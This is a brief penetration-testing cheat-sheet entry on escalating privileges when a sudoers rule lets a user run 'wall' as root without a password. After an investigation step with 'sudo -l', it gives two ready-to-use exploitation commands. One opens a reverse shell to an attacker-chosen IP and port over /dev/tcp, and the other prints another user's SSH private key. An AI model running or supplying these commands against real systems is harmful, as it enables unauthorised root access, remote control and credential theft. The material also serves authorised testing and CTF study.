# Sudo Wall Privilege Escalation

The `wall` command can display the result of OS command. Executing as root might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

```
sudo -l

(ALL) NOPASSWD: wall
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

```
# Reverse shell
sudo wall "$(bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1')"

# Gets a SSH private key of another user
sudo wall "$(cat /home/user/.ssh/id_rsa)"
```
